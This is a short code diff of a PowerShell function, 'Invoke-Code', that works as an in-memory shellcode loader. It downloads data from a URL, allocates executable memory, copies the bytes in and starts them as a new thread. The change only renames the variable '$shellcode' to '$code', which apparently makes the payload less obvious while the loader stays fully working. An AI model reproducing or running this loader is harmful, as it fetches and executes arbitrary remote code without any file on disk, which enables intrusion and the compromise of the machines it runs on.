@@ -34,17 +34,17 @@ function Invoke-Code {
 
         # Download shellcode directly into memory
         $webClient = New-Object System.Net.WebClient
-        $shellcode = $webClient.DownloadData($Url)
+        $code = $webClient.DownloadData($Url)
 
         # Allocate executable memory
-        $memoryAddress = [Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$shellcode.Length, 0x3000, 0x40)
+        $memoryAddress = [Win32]::VirtualAlloc([IntPtr]::Zero, [uint32]$code.Length, 0x3000, 0x40)
         
         if ($memoryAddress -eq [IntPtr]::Zero) {
             throw "Failed to allocate memory"
         }
 
         # Copy shellcode to allocated memory
-        [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $memoryAddress, $shellcode.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $memoryAddress, $code.Length)
 
         # Create and execute thread
         $threadHandle = [Win32]::CreateThread([IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
